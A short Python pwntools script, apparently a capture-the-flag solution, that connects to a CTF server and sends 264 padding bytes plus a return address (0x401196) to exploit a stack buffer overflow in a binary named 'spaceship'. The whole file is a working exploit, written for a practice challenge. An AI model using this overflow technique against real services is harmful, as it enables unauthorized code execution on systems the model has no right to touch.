from pwn import *


p = remote("pwn-ctf.cyberspace.ma", 8001)
#p = process("./spaceship")
payload = b"A" * 264 + p64(0x401196)

p.sendline(payload)

print(p.recvall())  
# print(p.recvall().decode(errors='ignore'))